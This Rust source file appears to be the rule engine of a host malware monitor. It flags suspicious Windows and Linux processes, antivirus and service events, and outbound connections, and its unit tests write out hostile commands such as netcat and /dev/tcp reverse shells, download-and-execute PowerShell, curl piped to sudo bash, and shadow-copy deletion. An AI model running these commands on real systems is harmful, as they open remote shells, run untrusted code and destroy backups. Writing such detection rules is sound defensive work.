//! What counts as "malware at work": rules for newly started processes, programs
//! talking to the internet and antivirus/service events. The live scripts only
//! collect raw records; every judgement is made here so it can be unit-tested and
//! so no attack-looking strings have to live inside the scripts themselves.

use crate::eval::Level;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::PathBuf;

pub struct Proc<'a> {
    pub pid: &'a str,
    pub ppid: &'a str,
    pub name: &'a str,
    pub parent: &'a str,
    /// S valid signature, U unsigned, B altered after signing, anything else: not checked.
    pub sig: &'a str,
    pub path: &'a str,
    pub cmd: &'a str,
}

#[derive(Debug)]
pub struct Hit {
    pub level: Level,
    pub key: String,
    pub text: String,
}

fn clip(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max).collect();
    out.push('…');
    out
}

fn hit(level: Level, rule: &str, title: &str, p: &Proc) -> Option<Hit> {
    let name = stem(p.name);
    let parent = if p.parent.is_empty() || p.parent == "?" { String::new() } else { format!("{} → ", p.parent) };
    let cmd = if p.cmd.is_empty() { p.path } else { p.cmd };
    let detail = if cmd.is_empty() { String::new() } else { format!(" · {}", clip(cmd, 160)) };
    Some(Hit { level, key: format!("proc:{rule}:{name}"), text: format!("{title} — {parent}{} (PID {}){detail}", p.name, p.pid) })
}

/// Lowercased program name without a trailing ".exe".
fn stem(name: &str) -> String {
    let n = name.to_lowercase();
    n.strip_suffix(".exe").unwrap_or(&n).to_string()
}

fn any(text: &str, needles: &[&str]) -> bool {
    needles.iter().any(|n| text.contains(n))
}

/// `word` appears in `text` with no letter or digit on either side.
fn has_word(text: &str, word: &str) -> bool {
    let mut from = 0;
    while let Some(i) = text[from..].find(word) {
        let (a, b) = (from + i, from + i + word.len());
        let before = text[..a].chars().next_back().is_none_or(|c| !c.is_alphanumeric());
        let after = text[b..].chars().next().is_none_or(|c| !c.is_alphanumeric());
        if before && after {
            return true;
        }
        from = b;
    }
    false
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let (mut acc, mut bits) = (0u32, 0u32);
    for c in s.bytes().filter(|c| *c != b'=') {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        };
        acc = acc << 6 | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    Some(out)
}

/// The script hidden behind PowerShell's `-EncodedCommand` (any accepted spelling:
/// -e, -ec, -enc, ...). `Some("")` when the option is present but cannot be decoded.
fn encoded_command(cmd: &str) -> Option<String> {
    let mut it = cmd.split_whitespace();
    while let Some(tok) = it.next() {
        let Some(opt) = tok.strip_prefix('-').or_else(|| tok.strip_prefix('/')) else { continue };
        let opt = opt.to_lowercase();
        if opt.is_empty() || !(opt == "ec" || "encodedcommand".starts_with(&opt)) {
            continue;
        }
        let payload = it.next().unwrap_or("").trim_matches(['"', '\'']);
        let text = base64_decode(payload)
            .map(|b| {
                let u: Vec<u16> = b.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
                String::from_utf16_lossy(&u)
            })
            .unwrap_or_default();
        return Some(text);
    }
    None
}

const SYSTEM_NAMES: &[&str] = &[
    "svchost", "lsass", "csrss", "winlogon", "services", "smss", "wininit", "spoolsv", "taskhostw", "dwm", "explorer",
    "conhost", "runtimebroker", "sihost", "ctfmon", "dllhost", "fontdrvhost",
];
const DOCUMENT_APPS: &[&str] = &["winword", "excel", "powerpnt", "outlook", "msaccess", "onenote", "hwp", "hword", "acrord32", "acrobat"];
const COMMAND_HOSTS: &[&str] = &["cmd", "powershell", "pwsh", "wscript", "cscript", "mshta", "regsvr32", "certutil", "bitsadmin", "rundll32"];
const DOWNLOAD: &[&str] = &[
    "downloadstring", "downloaddata", "downloadfile", "invoke-webrequest", "invoke-restmethod", "net.webclient", "start-bitstransfer",
];

fn windows(p: &Proc) -> Option<Hit> {
    let name = stem(p.name);
    let parent = stem(p.parent);
    let path = p.path.to_lowercase();
    // "\\?\C:\..." and "\??\C:\..." are the same file as "C:\..."
    let path = path.strip_prefix(r"\\?\").or_else(|| path.strip_prefix(r"\??\")).unwrap_or(&path).to_string();
    let mut cmd = p.cmd.to_lowercase();
    let shell = matches!(name.as_str(), "powershell" | "pwsh");
    let mut encoded = false;
    if shell {
        if let Some(script) = encoded_command(p.cmd) {
            encoded = true;
            cmd.push(' ');
            cmd.push_str(&script.to_lowercase());
        }
    }

    let in_windows = path.get(1..).is_some_and(|r| r.starts_with(":\\windows\\"));
    if SYSTEM_NAMES.contains(&name.as_str()) && !path.is_empty() && !in_windows {
        return hit(Level::Alert, "masquerade", "Windows 시스템 프로그램 이름을 흉내 낸 실행 파일", p);
    }
    if DOCUMENT_APPS.contains(&parent.as_str()) && COMMAND_HOSTS.contains(&name.as_str()) {
        return hit(Level::Alert, "doc-spawn", "문서 프로그램이 명령 실행기를 띄움 (악성 문서에서 흔한 동작)", p);
    }
    let lolbin = match name.as_str() {
        "mshta" => any(&cmd, &["http://", "https://", "javascript:", "vbscript:"]),
        "regsvr32" => any(&cmd, &["scrobj", "/i:http"]),
        "rundll32" => cmd.contains("javascript:"),
        "certutil" => cmd.contains("urlcache"),
        _ => false,
    };
    if lolbin {
        return hit(Level::Alert, "lolbin", "Windows 기본 도구로 외부 코드를 받아 실행", p);
    }
    if name == "bitsadmin" && cmd.contains("/transfer") {
        return hit(Level::Warn, "bits", "bitsadmin으로 파일 내려받기", p);
    }
    if matches!(name.as_str(), "vssadmin" | "wmic" | "bcdedit" | "wbadmin" | "cmd" | "powershell" | "pwsh") {
        let wipe = (cmd.contains("vssadmin") && cmd.contains("delete") && cmd.contains("shadows"))
            || (cmd.contains("shadowcopy") && cmd.contains("delete"))
            || (cmd.contains("bcdedit") && cmd.contains("recoveryenabled") && has_word(&cmd, "no"))
            || (cmd.contains("wbadmin") && cmd.contains("delete") && cmd.contains("catalog"));
        if wipe {
            return hit(Level::Alert, "backup-wipe", "백업·복원 지점 삭제 (랜섬웨어에서 흔한 동작)", p);
        }
    }
    if shell || name == "cmd" {
        let hidden = cmd.contains("hidden") && any(&cmd, &["-w ", "-win"]);
        let exec = has_word(&cmd, "iex") || cmd.contains("invoke-expression");
        let download = any(&cmd, DOWNLOAD) || has_word(&cmd, "iwr") || has_word(&cmd, "irm");
        if cmd.contains("set-mppreference") && cmd.contains("disable") || (cmd.contains("windefend") && any(&cmd, &["stop", "delete"])) {
            return hit(Level::Alert, "av-off", "백신(Defender) 보호를 끄려는 명령", p);
        }
        if cmd.contains("add-mppreference") && cmd.contains("exclusion") {
            return hit(Level::Warn, "av-exclude", "백신(Defender) 검사 제외 항목을 추가하는 명령", p);
        }
        if download && exec {
            let level = if hidden || encoded { Level::Alert } else { Level::Warn };
            return hit(level, "download-exec", "인터넷에서 받은 스크립트를 바로 실행", p);
        }
        if cmd.contains("frombase64string") && (exec || any(&cmd, &["reflection.assembly", "::load("])) {
            let level = if hidden { Level::Alert } else { Level::Warn };
            return hit(level, "decode-exec", "숨겨진(base64) 코드를 풀어서 실행", p);
        }
    }
    if matches!(name.as_str(), "sc" | "net" | "net1") && cmd.contains("windefend") && any(&cmd, &["stop", "delete"]) {
        return hit(Level::Alert, "av-off", "백신(Defender) 서비스를 멈추려는 명령", p);
    }
    if matches!(name.as_str(), "net" | "net1") && cmd.contains("/add") {
        if cmd.contains("localgroup") && cmd.contains("administrators") {
            return hit(Level::Warn, "admin-add", "관리자 그룹에 계정을 추가하는 명령", p);
        }
        if has_word(&cmd, "user") {
            return hit(Level::Warn, "user-add", "새 Windows 계정을 만드는 명령", p);
        }
    }
    if p.sig == "B" {
        return hit(Level::Warn, "tampered", "서명 이후 내용이 바뀐 실행 파일", p);
    }
    if p.sig == "U" {
        let roaming_root = path.rsplit_once('\\').is_some_and(|(dir, _)| dir.ends_with("\\appdata\\roaming") || dir.ends_with(":\\programdata"));
        if roaming_root || any(&path, &["\\users\\public\\", "\\$recycle.bin\\"]) {
            return hit(Level::Warn, "odd-place", "프로그램이 있을 자리가 아닌 곳에서 서명 없는 실행 파일 실행", p);
        }
        return hit(Level::Info, "unsigned", "임시·다운로드 폴더에서 서명 없는 실행 파일 실행", p);
    }
    None
}

const MINER_NAMES: &[&str] = &["xmrig", "kdevtmpfsi", "kinsing", "minerd", "cpuminer"];
const KERNEL_LOOKALIKES: &[&str] = &[
    "[kworker", "[kthreadd", "[ksoftirqd", "[migration", "[rcu_", "[kswapd", "[watchdog", "[khugepaged", "[kdevtmpfs",
];
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ash"];

fn piped_to_shell(cmd: &str) -> bool {
    cmd.split('|').skip(1).any(|part| {
        let first = part.trim_start().trim_start_matches("sudo ").split_whitespace().next().unwrap_or("");
        SHELLS.contains(&first.rsplit('/').next().unwrap_or(first))
    })
}

fn linux(p: &Proc) -> Option<Hit> {
    let name = p.name.to_lowercase();
    let parent = p.parent.to_lowercase();
    let cmd = p.cmd.to_lowercase();
    let path = p.path;

    if MINER_NAMES.iter().any(|m| name.starts_with(m)) || any(&cmd, &["stratum+tcp://", "stratum+ssl://", "--donate-level", "cryptonight", "nicehash"]) {
        return hit(Level::Alert, "miner", "가상화폐 채굴 프로그램으로 보이는 프로세스", p);
    }
    let netcat = matches!(name.as_str(), "nc" | "ncat" | "netcat" | "nc.openbsd" | "nc.traditional");
    let reverse = (netcat && any(&cmd, &[" -e ", " -c ", " --exec", " --sh-exec"]))
        || (name == "socat" && cmd.contains("exec:") && any(&cmd, &["sh", "pty"]))
        || cmd.contains("pty.spawn(")
        || (cmd.contains("mkfifo") && has_word(&cmd, "nc"))
        || (SHELLS.contains(&name.as_str()) && has_word(&cmd, "-i") && any(&cmd, &["/dev/tcp/", "/dev/udp/"]));
    if reverse {
        return hit(Level::Alert, "revshell", "원격에서 조종하는 셸(리버스 셸)로 보이는 프로세스", p);
    }
    if KERNEL_LOOKALIKES.iter().any(|k| cmd.starts_with(k)) && !cmd.contains("<defunct>") && !matches!(p.ppid, "0" | "2") {
        return hit(Level::Alert, "fake-kthread", "커널 스레드 이름을 흉내 낸 프로세스", p);
    }
    if path.starts_with("/memfd:") && !name.contains("runc") {
        return hit(Level::Alert, "memfd", "파일 없이 메모리에서만 실행되는 프로그램", p);
    }
    let web = matches!(parent.as_str(), "nginx" | "apache2" | "httpd") || parent.starts_with("php-fpm");
    if web && (SHELLS.contains(&name.as_str()) || matches!(name.as_str(), "nc" | "ncat" | "curl" | "wget" | "perl") || name.starts_with("python")) {
        return hit(Level::Alert, "webshell", "웹 서버가 셸/다운로더를 실행함 (웹셸 의심)", p);
    }
    if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| path.starts_with(d)) {
        if path.ends_with(" (deleted)") {
            return hit(Level::Alert, "tmp-deleted", "임시 폴더에서 실행된 뒤 파일이 지워진 프로그램", p);
        }
        return hit(Level::Warn, "tmp-exe", "임시 폴더에서 실행 중인 프로그램", p);
    }
    if (has_word(&cmd, "curl") || has_word(&cmd, "wget")) && piped_to_shell(&cmd) {
        return hit(Level::Warn, "download-exec", "인터넷에서 받은 스크립트를 바로 실행", p);
    }
    if cmd.contains("base64") && any(&cmd, &[" -d", " --decode"]) && piped_to_shell(&cmd) {
        return hit(Level::Warn, "decode-exec", "숨겨진(base64) 코드를 풀어서 실행", p);
    }
    if SHELLS.contains(&name.as_str()) && any(&cmd, &["/dev/tcp/", "/dev/udp/"]) {
        return hit(Level::Warn, "dev-tcp", "셸이 직접 네트워크 연결을 엶 (/dev/tcp)", p);
    }
    None
}

/// Judges one newly started process. `windows`: which rule set applies.
pub fn process(p: &Proc, windows_host: bool) -> Option<Hit> {
    if windows_host { windows(p) } else { linux(p) }
}

/// Antivirus / service / log events from this PC ("X" records, fields after the code).
pub fn system_event(code: &str, f: &[&str]) -> Option<Hit> {
    let get = |i: usize| f.get(i).copied().unwrap_or("");
    match code {
        "DEFTHREAT" => {
            let threat = get(1);
            let file = get(2).split(';').next().unwrap_or("").trim();
            let file = file.split_once(":_").map(|(_, p)| p).unwrap_or(file);
            let by = if get(3).is_empty() || get(3).eq_ignore_ascii_case("unknown") { String::new() } else { format!(" (실행: {})", clip(get(3), 80)) };
            Some(Hit {
                level: Level::Alert,
                key: format!("defthreat:{threat}"),
                text: format!("백신(Defender)이 악성코드를 탐지: {threat} · {}{by}", clip(file, 140)),
            })
        }
        "DEFOFF" => {
            let what = match get(0) {
                "5001" => "실시간 보호",
                "5010" => "스파이웨어 검사",
                _ => "바이러스 검사",
            };
            Some(Hit { level: Level::Alert, key: format!("defoff:{}", get(0)), text: format!("백신(Defender)의 {what}가 꺼졌습니다") })
        }
        "DEFCFG" => {
            let v = get(0);
            let l = v.to_lowercase();
            if l.contains("\\exclusions\\") {
                Some(Hit { level: Level::Warn, key: "defcfg:exclusion".into(), text: format!("백신(Defender) 검사 제외 항목이 바뀜: {}", clip(v, 160)) })
            } else if any(&l, &["\\real-time protection\\disable", "disableantispyware", "disableantivirus"]) && l.trim_end().ends_with("0x1") {
                Some(Hit { level: Level::Alert, key: "defcfg:disable".into(), text: format!("백신(Defender) 보호 기능을 끄는 설정 변경: {}", clip(v, 160)) })
            } else {
                None
            }
        }
        "DEFTAMPER" => Some(Hit {
            level: Level::Warn,
            key: "deftamper".into(),
            text: format!("백신 설정을 바꾸려는 시도를 변조 방지가 막음: {}", clip(get(0), 160)),
        }),
        "SVCNEW" => {
            let (name, image) = (get(0), get(1));
            let l = image.to_lowercase();
            let l = l.trim_start_matches('"');
            let trusted = l.starts_with("\\systemroot\\")
                || l.starts_with("%systemroot%\\")
                || l.starts_with("system32\\")
                || l.get(1..).is_some_and(|r| r.starts_with(":\\windows\\") || r.starts_with(":\\program files\\") || r.starts_with(":\\program files (x86)\\"));
            let writable = any(l, &["\\users\\", "\\programdata\\", "\\temp\\", "\\appdata\\"]) && !l.contains("\\programdata\\microsoft\\windows defender\\");
            let via_shell = any(l, &["cmd.exe", "cmd /c", "powershell", "%comspec%", "mshta", "rundll32", "regsvr32"]);
            let (level, title) = if writable || via_shell {
                (Level::Alert, "수상한 위치/방식의 서비스가 설치됨")
            } else if trusted {
                (Level::Info, "새 서비스 설치")
            } else {
                (Level::Warn, "일반적이지 않은 위치의 서비스가 설치됨")
            };
            let account = if get(3).is_empty() { String::new() } else { format!(" [{}]", get(3)) };
            Some(Hit { level, key: format!("svcnew:{name}"), text: format!("{title}: {name} · {}{account}", clip(image, 160)) })
        }
        "LOGCLEAR" => Some(Hit { level: Level::Alert, key: format!("logclear:{}", get(0)), text: format!("이벤트 로그가 지워짐: {} (흔적을 지우는 동작일 수 있음)", get(0)) }),
        _ => None,
    }
}

/// Ports that ordinary programs rarely talk to: mining pools, IRC, Tor, classic backdoors.
const ODD_PORTS: &[&str] = &["3333", "4444", "5555", "6667", "6697", "7777", "9001", "9030", "14433", "14444", "31337"];
const LEARNING_SECS: u64 = 24 * 3600;

/// Programs already seen talking to public addresses, per host. Kept on disk so a
/// program is reported only the first time it ever reaches out; the first day
/// after the list is created is a silent learning period.
pub struct OutSeen {
    known: HashSet<String>,
    learning_until: u64,
    path: Option<PathBuf>,
    odd_reported: HashMap<String, u64>,
}

impl OutSeen {
    /// `path: None` keeps everything in memory (tests, demo).
    pub fn load(path: Option<PathBuf>, now: u64) -> OutSeen {
        let mut s = OutSeen { known: HashSet::new(), learning_until: now + LEARNING_SECS, path, odd_reported: HashMap::new() };
        let text = s.path.as_ref().and_then(|p| fs::read_to_string(p).ok());
        match text {
            Some(text) => {
                s.learning_until = 0;
                for line in text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')) {
                    match line.strip_prefix("learning-until ") {
                        Some(t) => s.learning_until = t.trim().parse().unwrap_or(0),
                        None => {
                            s.known.insert(line.to_string());
                        }
                    }
                }
            }
            None => s.save(),
        }
        s
    }

    fn save(&self) {
        let Some(path) = &self.path else { return };
        let mut names: Vec<&String> = self.known.iter().collect();
        names.sort();
        let mut text = format!("# security-watch: programs seen talking to public addresses\nlearning-until {}\n", self.learning_until);
        for n in names {
            text.push_str(n);
            text.push('\n');
        }
        if let Some(dir) = path.parent() {
            let _ = fs::create_dir_all(dir);
        }
        let _ = fs::write(path, text);
    }

    /// One "program has a connection to public `ip:port`" observation.
    pub fn observe(&mut self, name: &str, ip: &str, port: &str, sig: &str, exe: &str, now: u64) -> Option<Hit> {
        if sig == "-" {
            return None; // signature check still pending; the record comes again
        }
        let key = stem(name);
        let unnamed = key.is_empty() || key == "?";
        let first = !unnamed && self.known.insert(key.clone());
        if first {
            self.save();
        }
        let who = if exe.is_empty() { name.to_string() } else { format!("{name} ({})", clip(exe, 120)) };
        if ODD_PORTS.contains(&port) {
            let k = format!("{key}:{port}");
            if self.odd_reported.get(&k).is_none_or(|t| now.saturating_sub(*t) >= 3600) {
                self.odd_reported.insert(k.clone(), now);
                return Some(Hit { level: Level::Warn, key: format!("oddport:{k}"), text: format!("채굴·백도어에서 자주 쓰는 포트로 외부 통신: {who} → {ip}:{port}") });
            }
        }
        if !first || (now < self.learning_until && sig != "B") {
            return None;
        }
        let (level, title) = match sig {
            "U" => (Level::Warn, "처음 보는 서명 없는 프로그램이 외부와 통신"),
            "B" => (Level::Warn, "서명 이후 내용이 바뀐 프로그램이 외부와 통신"),
            _ => (Level::Info, "처음 보는 프로그램이 외부와 통신"),
        };
        Some(Hit { level, key: format!("out:{key}"), text: format!("{title}: {who} → {ip}:{port}") })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn p<'a>(name: &'a str, parent: &'a str, sig: &'a str, path: &'a str, cmd: &'a str) -> Proc<'a> {
        Proc { pid: "10", ppid: "5", name, parent, sig, path, cmd }
    }

    fn win(name: &str, parent: &str, sig: &str, path: &str, cmd: &str) -> Option<Level> {
        process(&p(name, parent, sig, path, cmd), true).map(|h| h.level)
    }

    fn lin(name: &str, parent: &str, path: &str, cmd: &str) -> Option<Level> {
        process(&p(name, parent, "-", path, cmd), false).map(|h| h.level)
    }

    #[test]
    fn ordinary_windows_processes_are_quiet() {
        assert_eq!(win("svchost.exe", "services", "-", r"C:\Windows\System32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs"), None);
        assert_eq!(win("chrome.exe", "explorer", "-", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --type=renderer"), None);
        assert_eq!(win("powershell.exe", "Code", "-", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell -NoProfile -ExecutionPolicy Bypass -File build.ps1"), None);
        assert_eq!(win("powershell.exe", "x", "-", "", "powershell -NoProfile -Command \"[Console]::In.ReadToEnd() | Invoke-Expression\""), None);
        assert_eq!(win("cmd.exe", "explorer", "-", r"C:\Windows\System32\cmd.exe", "cmd /c echo no user here"), None);
        assert_eq!(win("conhost.exe", "node", "-", r"\\?\C:\Windows\system32\conhost.exe", "conhost.exe --headless"), None);
        assert_eq!(win("setup.exe", "explorer", "S", r"C:\Users\me\Downloads\setup.exe", "setup.exe"), None);
    }

    #[test]
    fn flags_windows_malware_patterns() {
        assert_eq!(win("svchost.exe", "explorer", "-", r"C:\Users\me\AppData\Roaming\svchost.exe", ""), Some(Level::Alert));
        assert_eq!(win("powershell.exe", "WINWORD", "-", "", "powershell -nop"), Some(Level::Alert));
        assert_eq!(win("mshta.exe", "explorer", "-", "", "mshta https://example.invalid/a.hta"), Some(Level::Alert));
        assert_eq!(win("vssadmin.exe", "cmd", "-", "", "vssadmin delete shadows /all /quiet"), Some(Level::Alert));
        assert_eq!(win("powershell.exe", "cmd", "-", "", "powershell -c \"iex (irm https://example.invalid/x.ps1)\""), Some(Level::Warn));
        assert_eq!(win("powershell.exe", "cmd", "-", "", "powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid')\""), Some(Level::Alert));
        assert_eq!(win("powershell.exe", "cmd", "-", "", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"), Some(Level::Alert));
        assert_eq!(win("net1.exe", "net", "-", "", "net1 user evil P@ss /add"), Some(Level::Warn));
        assert_eq!(win("a.exe", "explorer", "U", r"C:\Users\Public\a.exe", ""), Some(Level::Warn));
        assert_eq!(win("a.exe", "explorer", "U", r"C:\Users\me\AppData\Local\Temp\x\a.exe", ""), Some(Level::Info));
        assert_eq!(win("a.exe", "explorer", "B", r"C:\Tools\a.exe", ""), Some(Level::Warn));
    }

    #[test]
    fn decodes_encoded_powershell() {
        let script = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')";
        let cmd = format!("powershell.exe -NoP -enc {}", crate::runner::encode_ps(script));
        assert_eq!(encoded_command(&cmd).as_deref(), Some(script));
        assert_eq!(win("powershell.exe", "cmd", "-", "", &cmd), Some(Level::Alert));
        // an encoded command on its own is not suspicious, and -ExecutionPolicy is not -e
        let plain = format!("powershell -ep bypass -e {}", crate::runner::encode_ps("Get-Date"));
        assert_eq!(win("powershell.exe", "cmd", "-", "", &plain), None);
    }

    #[test]
    fn ordinary_linux_processes_are_quiet() {
        assert_eq!(lin("sshd", "sshd", "/usr/sbin/sshd", "sshd: dev [priv]"), None);
        assert_eq!(lin("node", "systemd", "/usr/bin/node", "node /srv/app/server.js"), None);
        assert_eq!(lin("bash", "sshd", "/usr/bin/bash", "bash -c curl -s https://example.invalid/health"), None);
        assert_eq!(lin("sh", "", "", "[sh] <defunct>"), None);
        assert_eq!(lin("nginx", "nginx", "", "nginx: worker process"), None);
    }

    #[test]
    fn flags_linux_malware_patterns() {
        assert_eq!(lin("xmrig", "bash", "/tmp/xmrig", "./xmrig -o pool.example.invalid:3333"), Some(Level::Alert));
        assert_eq!(lin("python3", "bash", "/usr/bin/python3", "python3 run.py -o stratum+tcp://pool.example.invalid:3333"), Some(Level::Alert));
        assert_eq!(lin("nc", "sh", "/usr/bin/nc", "nc 203.0.113.5 4444 -e /bin/sh"), Some(Level::Alert));
        assert_eq!(lin("bash", "sh", "/usr/bin/bash", "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"), Some(Level::Alert));
        assert_eq!(lin("kworker", "systemd", "", "[kworker/0:1]"), Some(Level::Alert));
        assert_eq!(lin("x", "systemd", "/memfd:x (deleted)", "x"), Some(Level::Alert));
        assert_eq!(lin("sh", "nginx", "/usr/bin/dash", "sh -c id"), Some(Level::Alert));
        assert_eq!(lin("a", "bash", "/tmp/a", "/tmp/a"), Some(Level::Warn));
        assert_eq!(lin("a", "bash", "/dev/shm/a (deleted)", "/dev/shm/a"), Some(Level::Alert));
        assert_eq!(lin("bash", "sshd", "/usr/bin/bash", "bash -c curl -fsSL https://example.invalid/i.sh | sudo bash"), Some(Level::Warn));
    }

    #[test]
    fn system_events() {
        let t = system_event("DEFTHREAT", &["1116", "Trojan:Win32/Test", r"file:_C:\x\a.exe; file:_C:\x\b.exe", r"C:\x\run.exe"]).unwrap();
        assert_eq!(t.level, Level::Alert);
        assert!(t.text.contains(r"C:\x\a.exe") && !t.text.contains("b.exe"));
        assert!(system_event("DEFCFG", &[r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\Controls\1 = 0x1"]).is_none());
        assert_eq!(system_event("DEFCFG", &[r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\x = 0x0"]).unwrap().level, Level::Warn);
        let svc = |image: &str| system_event("SVCNEW", &["svc", image, "user mode service", "LocalSystem"]).unwrap().level;
        assert_eq!(svc(r#""C:\Program Files\App\svc.exe" --run"#), Level::Info);
        assert_eq!(svc(r"\SystemRoot\System32\drivers\x.sys"), Level::Info);
        assert_eq!(svc(r"C:\Users\me\AppData\Local\Temp\svc.exe"), Level::Alert);
        assert_eq!(svc(r"%COMSPEC% /c echo x > \\.\pipe\x"), Level::Alert);
        assert_eq!(svc(r"D:\tools\svc.exe"), Level::Warn);
    }

    #[test]
    fn outbound_programs_are_reported_once_after_learning() {
        let mut s = OutSeen::load(None, 1000);
        assert!(s.observe("chrome", "203.0.113.1", "443", "S", "", 1000).is_none()); // learning
        let later = 1000 + LEARNING_SECS + 1;
        assert!(s.observe("chrome", "203.0.113.1", "443", "S", "", later).is_none());
        assert!(s.observe("newtool", "203.0.113.1", "443", "-", "", later).is_none()); // pending check
        assert_eq!(s.observe("newtool", "203.0.113.1", "443", "U", "", later).unwrap().level, Level::Warn);
        assert!(s.observe("newtool", "203.0.113.1", "443", "U", "", later + 5).is_none());
        assert_eq!(s.observe("other.exe", "203.0.113.1", "443", "S", "", later).unwrap().level, Level::Info);
        assert!(s.observe("?", "203.0.113.1", "443", "?", "", later).is_none());
        assert_eq!(s.observe("chrome", "203.0.113.9", "4444", "S", "", later).unwrap().level, Level::Warn);
        assert!(s.observe("chrome", "203.0.113.9", "4444", "S", "", later + 60).is_none());
        assert!(s.observe("chrome", "203.0.113.9", "4444", "S", "", later + 3700).is_some());
    }
}
